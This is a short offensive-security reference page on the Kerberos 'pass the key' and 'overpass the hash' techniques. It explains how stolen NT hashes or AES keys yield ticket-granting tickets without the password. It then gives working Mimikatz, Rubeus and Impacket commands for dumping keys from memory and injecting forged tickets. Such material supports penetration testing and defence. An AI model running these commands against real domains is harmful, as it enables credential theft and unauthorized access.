# Pass the Key

The Kerberos authentication protocol works with tickets in order to grant access. A Service Ticket (ST) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast).

The pre-authentication requires the requesting user to supply its secret key (`DES`, `RC4`, `AES128` or `AES256`) derived from the user password. An attacker knowing that secret key doesn't need knowledge of the actual password to obtain tickets. This is called pass-the-key.

Kerberos offers 4 different key types: `DES`, `RC4`, `AES-128` and `AES-256`.

* When the `RC4` etype is enabled, the `RC4` key can be used. The problem is that the `RC4` key is in fact the user's NT hash. Using a an NT hash to obtain Kerberos tickets is called overpass the hash.
* When `RC4` is disabled, other Kerberos keys (`DES`, `AES-128`, `AES-256`) can be passed as well. This technique is called pass the key. In fact, only the name and key used differ between overpass the hash and pass the key, the technique is the same.

The traditional `Pass the Hash` (`PtH`) technique involves reusing an `NTLM` password hash that doesn't touch Kerberos. The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key `(rc4_hmac`, `aes256_cts_hmac_sha1`, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`)

### Extract kerberos keys

```sh
sekurlsa::ekeys
```

### Craft the ticket

{% tabs %}
{% tab title="Mimikatz" %}
```sh
# Mimikatz with the different keys => use /ptt to inject the ticket into memory
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /rc4:<NTLM_HASH> /ptt
sekurlsa::pth /domain:<DOMAIN> /user:<USER>  /aes128:<aes128_key> /ptt
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /aes256:<aes256_key> /ptt
```
{% endtab %}

{% tab title="Rubeus" %}
```sh
# Rubeus with the different keys => use /ptt to inject the ticket into memory
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<NThash> /ptt
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes128:<aes128_key> /ptt
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:<aes256_key> /ptt
```
{% endtab %}

{% tab title="Impacket" %}
```sh
# On Linux
impacket-getTGT -hashes :<NThash> <DOMAIN>/<USER>@<TARGET>
impacket-getTGT -aesKey <KerberosKey> <DOMAIN>/<USER>@<TARGET>   # With AES 128 or 256
export KRB5CCNAME=<ccache>
```
{% endtab %}
{% endtabs %}
